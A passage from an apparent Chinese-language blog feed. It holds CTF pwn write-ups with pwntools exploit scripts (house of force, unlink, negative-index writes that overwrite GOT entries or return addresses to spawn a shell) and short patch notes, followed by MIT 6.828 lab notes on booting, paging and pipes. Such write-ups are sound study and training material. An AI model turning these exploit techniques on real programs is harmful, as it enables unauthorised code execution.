class="comment">#0</span></span><br><span class="line">add(<span class="string">b'a'</span>*<span class="number">0x58</span>)<span class="comment">#1</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">'paper index: '</span>)</span><br><span class="line">io.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">leak_libc(<span class="string">'puts'</span>,u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">0x198db0</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(libc_base).startswith(<span class="string">"0x7f"</span>):</span><br><span class="line">    <span class="keyword">raise</span> EOFError</span><br><span class="line"></span><br><span class="line">add(<span class="string">b'a'</span>*<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b'a'</span>*<span class="number">0x60</span>+p64(libc_base+<span class="number">0x219098</span>))<span class="comment">#libc.got['strlen']</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b'a'</span>*<span class="number">0x50</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b'k'</span>*<span class="number">0x50</span>)<span class="comment">#3</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">onegadget = libc_base+<span class="number">0xebcf1</span></span><br><span class="line"><span class="comment"># edit(3,p64(system_addr))</span></span><br><span class="line">edit(<span class="number">3</span>,p64(onegadget))</span><br><span class="line"><span class="comment"># shell()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="easy-force"><a href="#easy-force" class="headerlink" title="easy_force"></a>easy_force</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序只有一个功能,可以看出malloc的size不限,最多可以制造0x20的堆溢出.且可以得到堆块的地址(mmap的堆块就是libc地址).符合house of force的条件.改下got表就好了.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309302115399.png"></p><p>覆盖got表的时候可以用one_gadget,看了别的师傅的巧妙布置,覆盖malloc_got为system,然后在size输入binsh字符串的地址.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309302114666.png"></p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ask(<span class="number">0</span>,<span class="number">0x30000</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'on '</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">' '</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">leak_libc(<span class="string">'puts'</span>,libc_addr-<span class="number">0x54b970</span>)</span><br><span class="line"></span><br><span class="line">ask(<span class="number">1</span>,<span class="number">0x10</span>,flat([<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="number">0</span>,-<span class="number">1</span>]))</span><br><span class="line">io.recvuntil(<span class="string">'on '</span>)</span><br><span class="line">top = <span class="built_in">int</span>(io.recvuntil(<span class="string">' '</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(top))</span><br><span class="line"></span><br><span class="line">ask(<span class="number">2</span>,force(top,e.got[<span class="string">'malloc'</span>]),<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">ask(<span class="number">3</span>,<span class="number">0x8</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'4.go away\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'index?'</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">io.sendlineafter(<span class="string">'want'</span>,<span class="built_in">str</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>改0x30为v2就好,记得补nop.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309302130948.png"></p><h2 id="Printf-but-not-fmtstr"><a href="#Printf-but-not-fmtstr" class="headerlink" title="Printf_but_not_fmtstr"></a>Printf_but_not_fmtstr</h2><p>题目名称意义不明.glibc2.36堆题但是partial relro,能改got就改got了.有uaf,堆块限制在0x500-0x900.</p><p>先unsortedbin泄露地址,然后打unlink.</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x518</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress()-<span class="number">0x1f6cc0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x530</span>)</span><br><span class="line">payload = flat([<span class="number">0</span>,<span class="number">0x521</span>,<span class="number">0x4040E8</span>-<span class="number">0x18</span>,<span class="number">0x4040E8</span>-<span class="number">0x10</span>])</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b'a'</span>*<span class="number">0x10</span>+p64(e.got[<span class="string">'free'</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(p.system_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="array-index-bank"><a href="#array-index-bank" class="headerlink" title="array_index_bank"></a>array_index_bank</h2><p>负数索引,泄露pie和栈地址,然后绕过一些检查先改you再改返回地址就行了.</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="string">'-3'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'] = '</span>)</span><br><span class="line">pie_base = p.recvaddress(<span class="string">"int"</span>)-<span class="number">0x14ff</span></span><br><span class="line">lg(<span class="string">"pie_base"</span>,pie_base)</span><br><span class="line"></span><br><span class="line">you = pie_base+<span class="number">0x4010</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="string">'-2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'] = '</span>)</span><br><span class="line">ret_addr = p.recvaddress(<span class="string">"int"</span>)+<span class="number">8</span></span><br><span class="line">stack = ret_addr-<span class="number">0x38</span></span><br><span class="line">lg(<span class="string">"ret"</span>,ret_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'2'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="built_in">str</span>((you-stack)//<span class="number">8</span>))</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'2'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="built_in">str</span>((ret_addr-stack)//<span class="number">8</span>))</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="built_in">str</span>(pie_base+<span class="number">0x1318</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>改为无符号比较:jle-&gt;jbe</p>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab1-Lab2</title>
      <link href="/2023/6.828-Lab1-2/"/>
      <url>/2023/6.828-Lab1-2/</url>
      
        <content type="html"><![CDATA[<h1 id="LEC-1"><a href="#LEC-1" class="headerlink" title="LEC 1"></a>LEC 1</h1><h2 id="操作系统概述"><a href="#操作系统概述" class="headerlink" title="操作系统概述"></a>操作系统概述</h2><p>管道本质上是一个内核的缓冲区,大多数情况下半开工,描述符可跨fork继承.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309202328496.png"></p><h2 id="Lab-1-Booting-a-PC"><a href="#Lab-1-Booting-a-PC" class="headerlink" title="Lab 1: Booting a PC"></a>Lab 1: Booting a PC</h2><h3 id="PC-Bootstrap"><a href="#PC-Bootstrap" class="headerlink" title="PC Bootstrap"></a>PC Bootstrap</h3><p>BIOS: 设置中断描述符表,初始化设备.加载bootloader</p><blockquote><p>When the BIOS runs, it sets up an interrupt descriptor table and initializes various devices such as the VGA display. This is where the “Starting SeaBIOS” message you see in the QEMU window comes from. </p></blockquote><span id="more"></span><p>计算机通电后地址设为0xf000:0xfff0,通过一个jmp指令跳转到BIOS的稍前部分</p><blockquote><p>Therefore we shouldn’t be surprised that the first thing that the BIOS does is jmp backwards to an earlier location in the BIOS</p></blockquote><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309211035578.png"></p><h3 id="The-Boot-Loader"><a href="#The-Boot-Loader" class="headerlink" title="The Boot Loader"></a>The Boot Loader</h3><p>BIOS将第一个扇区(引导扇区)加载到物理地址0x7c00~0x7dff的内存中,jmp到0x0000:0x7c00,控制权转移到bootloader.</p><blockquote><p>如果此扇区末尾两个字节分别是魔数0x55和0xaa，则BIOS认为此扇区中存在可执行的程序</p></blockquote><blockquote><p>Floppy and hard disks for PCs are divided into 512 byte regions called sectors. A sector is the disk’s minimum transfer granularity: each read or write operation must be one or more sectors in size and aligned on a sector boundary. If the disk is bootable, the first sector is called the boot sector, since this is where the boot loader code resides. When the BIOS finds a bootable floppy or hard disk, it loads the 512-byte boot sector into memory at physical addresses 0x7c00 through 0x7dff, and then uses a jmp instruction to set the CS:IP to 0000:7c00, passing control to the boot loader. Like the BIOS load address, these addresses are fairly arbitrary - but they are fixed and standardized for PCs.</p></blockquote><p>MBR与bootloader的关系.</p><blockquote><p>MBR是主引导记录（Master Boot Record），也被称为主引导扇区，是计算机开机以后访问硬盘时所必须要读取的第一个扇区。其内部前446字节存储了bootloader代码，其后是4个16字节的“磁盘分区表”。</p></blockquote><h4 id="boot-S流程分析"><a href="#boot-S流程分析" class="headerlink" title="boot.S流程分析"></a>boot.S流程分析</h4><p>.set 相当于define的宏定义</p><p>.code16以16-bit模式产生代码<br>cli(clear interrupt flag),禁止中断发生.</p><blockquote><p> 下面是两条规则：<br>       1）在改变SS：SP之前，必须用cli指令屏蔽中断，然后等操作执行完立即用sti指令恢复<br>       2）SS：SP需要设置在空闲的内存地址，不要建立在其他的程序（尤其是系统的）代码区   </p></blockquote><p>cld(clear direction flag),清除方向标志位,当方向位清除时,字符串操作按递增地址的方式进行.<br>对应的有sti,std(set)</p><p>开启A20 gate:向0x64端口写入0xd1的命令,再向0x60端口写入0xdf(0x11011111)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">seta20.1:</span><br><span class="line">  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">  testb   $0x2,%al</span><br><span class="line">  jnz     seta20.1</span><br><span class="line"></span><br><span class="line">  movb    $0xd1,%al               # 0xd1 -&gt; port 0x64</span><br><span class="line">  outb    %al,$0x64</span><br><span class="line"></span><br><span class="line">seta20.2:</span><br><span class="line">  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">  testb   $0x2,%al</span><br><span class="line">  jnz     seta20.2</span><br><span class="line"></span><br><span class="line">  movb    $0xdf,%al               # 0xdf -&gt; port 0x60</span><br><span class="line">  outb    %al,$0x60</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309211153437.png"></p><p>加载gdt,lgdt 48位内存数据,加载到48位寄存器GDTR,16位的(gdt)段界限,32位的(gdt)段基址<br>gdt初始化内容:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Bootstrap GDT</span><br><span class="line">.p2align 2                                # force 4 byte alignment</span><br><span class="line">gdt:</span><br><span class="line">  SEG_NULL# null seg</span><br><span class="line">  SEG(STA_X|STA_R, 0x0, 0xffffffff)# code seg</span><br><span class="line">  SEG(STA_W, 0x0, 0xffffffff)    </span><br></pre></td></tr></tbody></table></figure><p>将%cr0寄存器PE标志置1,长跳转ljmp $PROT_MODE_CSEG, $protcseg以更新cs基地址,正式进入保护模式.</p><p>更新其他段寄存器<br>这里有个点需要注意一下,段选择子的0-1位用来存储RPL,第2位是TI(table indicator)位,用来指示选择子是在GDT(0)还是LDT(1)中,3~15位是13位的段描述符索引值,所以boot.S中定义的0x8和0x10代表的序号其实是1和2.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.set PROT_MODE_CSEG, 0x8         # kernel code segment selector</span><br><span class="line">.set PROT_MODE_DSEG, 0x10        # kernel data segment selector</span><br></pre></td></tr></tbody></table></figure><p>设置esp后便可以调用c代码bootmain.</p><blockquote><p>control starts in boot.S – which sets up protected mode,and a stack so C code then run, then calls bootmain()</p></blockquote><h4 id="boot-main-c流程分析"><a href="#boot-main-c流程分析" class="headerlink" title="(boot)main.c流程分析"></a>(boot)main.c流程分析</h4><p>从扇区1(第二个扇区)的位置开始,从硬盘读取8个扇区(一个页大小)的数据到物理内存0x10000处.这一个页的内容只是ELF文件(Kernel)的部分内容,但至少包含了完整的文件头.接下来便根据程序头表读入程序中的各个段到内存中,(这里的段不是内存中的段,而是硬盘上ELF文件中的各个代码段数据段等),形成内核映像,即真正运行的内核.</p><blockquote><p>内核被加载到内存后,loader还要通过分析其elf结构将其展开到新的位置,所以说,内核在内存中有两份拷贝,一份是elf格式的源文件kernel.bin,另一份是loader解析elf格式的kernel.bin后在内存中生成的内核映像,这个映像才是真正运行的内核.</p></blockquote><p>完成内核的加载后,跳转到ELF头中记录的内核的入口点.0x10000c</p><p>补充一下JOS的磁盘镜像相关内容.JOS的引导盘由两部分组成,boot和kernel,boot位于第一个扇区(引导扇区).所以需要从扇区1开始读取Kernel的ELF文件.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># How to build the kernel disk image</span><br><span class="line">$(OBJDIR)/kern/kernel.img: $(OBJDIR)/kern/kernel $(OBJDIR)/boot/boot</span><br><span class="line">@echo + mk $@</span><br><span class="line">$(V)dd if=/dev/zero of=$(OBJDIR)/kern/kernel.img~ count=10000 2&gt;/dev/null</span><br><span class="line">$(V)dd if=$(OBJDIR)/boot/boot of=$(OBJDIR)/kern/kernel.img~ conv=notrunc 2&gt;/dev/null</span><br><span class="line">$(V)dd if=$(OBJDIR)/kern/kernel of=$(OBJDIR)/kern/kernel.img~ seek=1 conv=notrunc 2&gt;/dev/null</span><br><span class="line">$(V)mv $(OBJDIR)/kern/kernel.img~ $(OBJDIR)/kern/kernel.img</span><br></pre></td></tr></tbody></table></figure><h3 id="The-Kernel"><a href="#The-Kernel" class="headerlink" title="The Kernel"></a>The Kernel</h3><h4 id="entry-S流程分析"><a href="#entry-S流程分析" class="headerlink" title="entry.S流程分析"></a>entry.S流程分析</h4><p>上来第一个指令就看不懂</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movw$0x1234,0x472# warm boot</span><br></pre></td></tr></tbody></table></figure><p>加载页目录表到$cr3(页目录寄存器)<br>$cr0的PG位置1,开启分页模式.<br>初始化堆栈</p><p>开启分页模式后,线性地址的高十位作为页目录表entry_pgdir的索引,中间10位作为页表entry_pgtable的索引.<br>如0xf0100000,页部件先以960为索引在页目录表中找到对应的页表条目,再以256为索引找到页表条目中的物理地址0x100000.<br>理解了这个过程之后再看entrypgdir.c就明白如下映射的原理了:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[KERNBASE, KERNBASE+4MB) --&gt; [0, 4MB) .</span><br><span class="line">[0, 4MB) --&gt; [0, 4MB)</span><br></pre></td></tr></tbody></table></figure><h4 id="Formatted-Printing-to-the-Console"><a href="#Formatted-Printing-to-the-Console" class="headerlink" title="Formatted Printing to the Console"></a>Formatted Printing to the Console</h4><p>c可变参数的实现机制:<br> va_list args;               // 准备接受参数的列表对象<br> va_start(args, fmt);        // 从…中取出参数到args中，并指定…之前的参数<br> T va_arg（va_list， T）;<br> va_end(args);               // 释放参数列表</p><p>其实就是通过va_start得到固定参数fmt的地址再加上sizeof(fmt)得到第一个参数的地址,之后每次调用va_arg函数获得T类型的参数值,并加sizeof(T)指向下一个参数.</p><p>八进制改改就好了</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'o'</span>:</span><br><span class="line"><span class="comment">// Replace this with your code.</span></span><br><span class="line">num = getint(&amp;ap,lflag);</span><br><span class="line"><span class="keyword">if</span>((<span class="type">long</span> <span class="type">long</span>)num &lt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">putch(<span class="string">'-'</span>,putdat);</span><br><span class="line">num = -(<span class="type">long</span> <span class="type">long</span>)num;</span><br><span class="line">}</span><br><span class="line">base = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">goto</span> number;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></tbody></table></figure><h4 id="The-Stack"><a href="#The-Stack" class="headerlink" title="The Stack"></a>The Stack</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_backtrace</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// Your code here.</span></span><br><span class="line">cprintf(<span class="string">"Stack backtrace:\n"</span>);</span><br><span class="line"><span class="type">uint32_t</span> ebp = read_ebp();</span><br><span class="line"><span class="type">uint32_t</span> eip = *(<span class="type">uint32_t</span>*)(ebp+<span class="number">4</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Eipdebuginfo</span> <span class="title">dinfo</span>;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line">debuginfo_eip(eip,&amp;dinfo);</span><br><span class="line">cprintf(<span class="string">"  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n"</span>,ebp,eip,*(<span class="type">uint32_t</span>*)(ebp+<span class="number">8</span>),*(<span class="type">uint32_t</span>*)(ebp+<span class="number">12</span>),*(<span class="type">uint32_t</span>*)(ebp+<span class="number">16</span>),*(<span class="type">uint32_t</span>*)(ebp+<span class="number">20</span>),*(<span class="type">uint32_t</span>*)(ebp+<span class="number">24</span>));</span><br><span class="line">cprintf(<span class="string">"         %s:%d: %.*s+%d\n"</span>,dinfo.eip_file,dinfo.eip_line,dinfo.eip_fn_namelen,dinfo.eip_fn_name,eip-dinfo.eip_fn_addr);</span><br><span class="line">ebp = *(<span class="type">uint32_t</span>*)(ebp);</span><br><span class="line"><span class="keyword">if</span>(ebp!=<span class="number">0</span>)</span><br><span class="line">eip = *(<span class="type">uint32_t</span>*)(ebp+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>其实没怎么弄明白.<br><a href="https://sourceware.org/gdb/onlinedocs/stabs.html#Symbol-Tables">https://sourceware.org/gdb/onlinedocs/stabs.html#Symbol-Tables</a><br><a href="https://sourceware.org/gdb/onlinedocs/stabs.html#Line-Numbers">https://sourceware.org/gdb/onlinedocs/stabs.html#Line-Numbers</a></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stab_binsearch(stabs, &amp;lline, &amp;rline, N_SLINE, addr);</span><br><span class="line"><span class="keyword">if</span> (lline &lt;= rline) {</span><br><span class="line">info-&gt;eip_line = stabs[lline].n_desc;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">info-&gt;eip_fn_addr = addr;</span><br><span class="line">lline = lfile;</span><br><span class="line">rline = rfile;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="LEC-3"><a href="#LEC-3" class="headerlink" title="LEC 3"></a>LEC 3</h1><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>先学学pipe的用法.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span>    pipefd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">char</span>   buf;</span><br><span class="line">    <span class="type">pid_t</span>  cpid;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Usage: %s &lt;string&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd) == <span class="number">-1</span>) {</span><br><span class="line">        perror(<span class="string">"pipe"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line">    cpid = fork();</span><br><span class="line">    <span class="keyword">if</span> (cpid == <span class="number">-1</span>) {</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (cpid == <span class="number">0</span>) {    <span class="comment">/* Child reads from pipe */</span></span><br><span class="line">        close(pipefd[<span class="number">1</span>]);          <span class="comment">/* Close unused write end */</span></span><br><span class="line">        <span class="keyword">while</span> (read(pipefd[<span class="number">0</span>], &amp;buf, <span class="number">1</span>) &gt; <span class="number">0</span>)</span><br><span class="line">            write(STDOUT_FILENO, &amp;buf, <span class="number">1</span>);</span><br><span class="line">        write(STDOUT_FILENO, <span class="string">"\n"</span>, <span class="number">1</span>);</span><br><span class="line">        close(pipefd[<span class="number">0</span>]);</span><br><span class="line">        _exit(EXIT_SUCCESS);</span><br><span class="line">    } <span class="keyword">else</span> {            <span class="comment">/* Parent writes argv[1] to pipe */</span></span><br><span class="line">        close(pipefd[<span class="number">0</span>]);          <span class="comment">/* Close unused read end */</span></span><br><span class="line">        write(pipefd[<span class="number">1</span>], argv[<span class="number">1</span>], <span class="built_in">strlen</span>(argv[<span class="number">1</span>]));</span><br><span class="line">        close(pipefd[<span class="number">1</span>]);          <span class="comment">/* Reader will see EOF */</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);                <span class="comment">/* Wait for child */</span></span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 